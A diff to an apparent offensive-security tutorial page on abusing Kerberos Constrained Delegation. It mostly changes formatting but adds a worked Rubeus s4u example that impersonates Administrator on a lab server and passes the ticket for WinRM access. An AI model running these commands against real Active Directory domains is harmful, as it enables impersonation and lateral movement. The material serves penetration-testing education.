@@ -39,7 +39,7 @@ During authentication to Srv$ machine account (with Constrained Delegation) User
 
 ## Abuse
 
-An account with Constrained Delegation enabled is allowed to request TGT tickets to itself as any user, in a process known as _S4U2self_. That TGT is then used to request a valid TGS to `msds-allowedToDelegateTo` SPNs. As a result, we (`/user` param) obtain a TGS of another domain user (`/impersonateuser`) which is valid to the target SPN (`/msdsspn`). In addition, the service class in the target SPN (the protocol part) can be changed to any other (`/altservice`).
+An account with Constrained Delegation enabled is allowed to request TGT tickets to itself as any user, in a process known as *S4U2self*. That TGT is then used to request a valid TGS to `msds-allowedToDelegateTo` SPNs. As a result, we (`/user` param) obtain a TGS of another domain user (`/impersonateuser`) which is valid to the target SPN (`/msdsspn`). In addition, the service class in the target SPN (the protocol part) can be changed to any other (`/altservice`).
 
 > **NOTE**: `/altservice` parameter can be used to access other services on the target server and exploit different attack techniques:
 >
@@ -49,8 +49,17 @@ An account with Constrained Delegation enabled is allowed to request TGT tickets
 
 ```powershell
 # Using aes256 of compromised user (RC4 can be used as well)
-.\Rubeus.exe s4u /user:$compromised_user /aes256:$compromised_user_aes256 /impersonateuser:$domain_user_to_impersonate /msdsspn:$legit_spn_from_msds_list /altservice:$alternative_service_class
+.\Rubeus.exe s4u /user:$compromised_user /aes256:$compromised_user_aes256 /impersonateuser:$domain_user_to_impersonate /msdsspn:$legit_spn_from_msds_list /altservice:$alternative_service_class /ptt
 ```
+
+Example:
+
+```powershell
+# Example
+.\Rubeus.exe s4u /user:MACHINE01$ /aes256:<machine01_aes> /impersonateuser:Administrator /msdsspn:"CIFS/srv01.adlab.local" /altservice:HOST,HTTP /ptt
+```
+
+Now we should be able to access `srv01.adlab.local` using [WinRM](/windows-lateral-movement/winrm) (`HOST,HTTP` services) as `Administrator` user.
 
 ## Enumerate machines and users with Constrained Delegation
 
@@ -63,7 +72,7 @@ Get-DomainComputer -TrustedToAuth | select samaccountname, userprincipalname, ms
 
 ## References
 
-* [Ired, _Kerberos Constrained Delegation_](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
-* [NotSoShant.io, _Attacking Kerberos: Constrained Delegaton_](https://www.notsoshant.io/blog/attacking-kerberos-constrained-delegation/)
-* [Rubeus Tool, _Constrained Delegation_](https://github.com/GhostPack/Rubeus?tab=readme-ov-file#s4u)
-* [Orange, _Constrained Delegation Considerations for Lateral Movement_](https://sensepost.com/blog/2022/constrained-delegation-considerations-for-lateral-movement/)
+* [Ired, *Kerberos Constrained Delegation*](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
+* [NotSoShant.io, *Attacking Kerberos: Constrained Delegaton*](https://www.notsoshant.io/blog/attacking-kerberos-constrained-delegation/)
+* [Rubeus Tool, *Constrained Delegation*](https://github.com/GhostPack/Rubeus?tab=readme-ov-file#s4u)
+* [Orange, *Constrained Delegation Considerations for Lateral Movement*](https://sensepost.com/blog/2022/constrained-delegation-considerations-for-lateral-movement/)
